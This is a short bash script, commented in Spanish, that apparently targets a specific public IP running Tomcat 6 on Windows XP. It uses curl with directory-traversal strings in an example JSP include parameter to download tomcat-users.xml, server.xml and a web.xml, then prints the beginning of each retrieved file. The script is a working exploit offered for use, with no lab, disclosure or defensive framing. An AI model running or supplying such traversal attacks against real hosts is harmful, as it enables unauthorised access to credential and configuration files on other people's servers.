# Archivos CRÍTICOS de Tomcat 6 en Windows XP
TARGET="https://189.254.143.102"

echo "=== EXTRACTING TOMCAT-USERS.XML ==="
curl -k "$TARGET/examples/jsp/include/include.jsp?page=../../../../../../../../Program Files/Apache Software Foundation/Tomcat 6.0/conf/tomcat-users.xml" -o tomcat-users.xml

echo "=== EXTRACTING SERVER.XML ==="
curl -k "$TARGET/examples/jsp/include/include.jsp?page=../../../../../../../../Program Files/Apache Software Foundation/Tomcat 6.0/conf/server.xml" -o server.xml

echo "=== EXTRACTING WEB.XML ==="
curl -k "$TARGET/examples/jsp/include/include.jsp?page=../../../../../../../../Tomcat 6.0/webapps/sito/WEB-INF/web.xml" -o web.xml

# Verificar si se extrajo contenido
echo "=== CHECKING EXTRACTED FILES ==="
ls -la *.xml
for file in *.xml; do
    echo "--- $file ---"
    head -20 "$file"
    echo ""
done
